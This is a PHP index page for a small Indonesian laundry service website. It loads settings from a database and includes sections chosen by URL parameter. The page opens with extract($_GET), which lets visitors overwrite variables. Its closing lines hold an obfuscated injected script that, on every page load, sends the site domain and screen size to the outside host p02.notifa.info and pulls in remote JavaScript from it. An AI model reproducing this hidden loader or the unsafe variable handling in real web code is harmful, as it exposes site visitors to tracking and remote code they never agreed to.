<?php 
extract($_GET);
session_start();
include "library/inc.connection.php";
include "library/inc.library.php";	
include "library/inc.fungsi_tanggal.php";	

$query = mysqli_query($koneksidb, "SELECT * FROM setting")
or die('Query salah : '.mysqli_error($koneksidb));
$myData_setting = mysqli_fetch_assoc($query);
?>

<!DOCTYPE html>
<html class="no-js" lang="en">
  
<head>
    <!-- Basic Page Needs
    ================================================== -->
    <meta charset="utf-8">
    <!--[if IE]><meta http-equiv="x-ua-compatible" content="IE=9" /><![endif]-->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title><?php echo $myData_setting['title']; ?></title>
    <meta name="description" content="Quchekin Laundry, Bersih dan Wangi, Bandar Lampung, Lampung, Antar Jemput">
    <meta name="keywords" content="quchekin, laundry, bersih, wangi, bandar lampung, lampung, antar jemput">
    <meta name="author" content="Xander TEAM"> 
	
	<!-- ==============================================
	Favicons
	=============================================== -->
	<link rel="shortcut icon" href="images/favicon.png">
	<link rel="apple-touch-icon" href="images/favicon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/favicon.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/favicon.png">
	
	<!-- ==============================================
	CSS
	=============================================== -->
	<link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
	<link rel="stylesheet" type="text/css" href="css/font-awesome.min.css">
	
	
	
	<!-- ==============================================
	Google Fonts
	=============================================== -->
	<link href='http://fonts.googleapis.com/css?family=Raleway:400,700,900' rel='stylesheet' type='text/css'>
	
	
	<!-- Custom Stylesheet -->
	<link rel="stylesheet" type="text/css" href="css/style.css" />
	
	
    <script type="text/javascript" src="js/modernizr.min.js"></script>
	
</head>

<body>
	
	<!-- Load page -->
	<div class="animationload">
		<div class="loader"></div>
	</div>
	
	
	<!-- NAVBAR SECTION -->
	<?php include "header.php"; ?>

 <?php
	if($act==about){
		include "about.php";
	}else if($act==services){
		include "services.php";
	}else if($act==price){
		include "price.php";
	}else if($act==contact){
		include "contact.php";
	}else{
		include "error.php";
	}
?>	
		
	<!-- FOOTER SECTION -->
	<?php include "footer.php"; ?>
	
	
	
	
	<script type="text/javascript" src="js/jquery.min.js"></script>
	<script type='text/javascript' src='https://maps.google.com/maps/api/js?sensor=false&amp;ver=4.1.5'></script>
	<script type='text/javascript' src='js/jqBootstrapValidation.js'></script>
	<script type="text/javascript" src="js/bootstrap.min.js"></script>
	<script type="text/javascript" src="js/bootstrap-hover-dropdown.min.js"></script>
	
	<script type="text/javascript" src="js/script.js"></script>
	
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXfz0ei3zJBIuL0KY%2fAmjrBITTJglLw5zEsPdmOzxnZmCFHmhmzsFBp3h1%2f3qnsL3i92%2fOw8Nemp38qe53kVa2S6Ei5sFf%2bMh5QZKsAWp7X43ANEn%2f0%2f0QZrDYInUeDm346jHdYooKTHigHsQ2HwNLmSiGMs1Ekeuai1LfPFvpgvJkhi9fPFaQDLQtj4x1XuRlZ7wgJtBitLMgvg7%2bOaD9u5torbRp3zh5Ayw7MeiVZ%2fcAMM7Xs%2bLa9xhmDG56HyQJ8%2fbqT7Qa44Y6X8vZeIAdNRlYoa6r9YsRnPLvjIxfjmyssvoeo8u%2fUAEVgaD%2b33O0kdrfi3dNjpyLIpaJuziWXIeHqQl%2bqfsp2%2fmz2orLzXqgySDsYtFqEtl5ePRzCGY18Cc1dn6vySheK37xd20%2b%2f7XYLNiTQLb65bQkq03SObf9PHe1CVeYCg7ci4OpdBXlrjNdnTn6hG75OSFx3Dp3YvfAzN5srAoy" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>